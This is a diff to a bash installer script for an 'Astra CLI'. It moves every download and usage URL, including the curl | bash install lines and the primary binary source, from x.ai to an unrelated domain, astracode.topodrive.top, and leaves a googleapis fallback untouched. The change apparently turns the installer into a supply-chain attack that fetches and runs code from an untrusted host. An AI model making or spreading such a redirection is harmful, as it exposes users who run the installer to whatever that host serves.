@@ -1,14 +1,14 @@
 #!/bin/bash
 #
-# Astra CLI installer — https://x.ai/cli/install.sh
+# Astra CLI installer — https://astracode.topodrive.top/cli/install.sh
 #
 # Auth: ASTRA_DEPLOYMENT_KEY (takes precedence) or ~/.astra/auth.json from `astra login`.
 # Env: ASTRA_CHANNEL (stable|alpha|enterprise, default: stable), ASTRA_BIN_DIR, ASTRA_PROXY_URL
 #
 # Usage:
-#   curl -fsSL https://x.ai/cli/install.sh | bash            # latest stable
-#   curl -fsSL https://x.ai/cli/install.sh | bash -s 0.1.42  # specific version
-#   ASTRA_DEPLOYMENT_KEY=<key> bash <(curl -fsSL https://x.ai/cli/install.sh)
+#   curl -fsSL https://astracode.topodrive.top/cli/install.sh | bash            # latest stable
+#   curl -fsSL https://astracode.topodrive.top/cli/install.sh | bash -s 0.1.42  # specific version
+#   ASTRA_DEPLOYMENT_KEY=<key> bash <(curl -fsSL https://astracode.topodrive.top/cli/install.sh)
 #
 # Windows: run under Git for Windows / MSYS2 Bash (same curl | bash flow); WSL
 # uses the Linux binary.
@@ -165,7 +165,7 @@ if [ "$os" = "macos" ] && [ "$arch" = "x86_64" ]; then
     fi
 fi
 
-BASE_URL_PRIMARY="https://x.ai/cli"
+BASE_URL_PRIMARY="https://astracode.topodrive.top/cli"
 BASE_URL_FALLBACK="https://storage.googleapis.com/grok-build-public-artifacts/cli"
 DOWNLOAD_DIR="$HOME/.astra/downloads"
 BIN_DIR="${ASTRA_BIN_DIR:-$HOME/.astra/bin}"
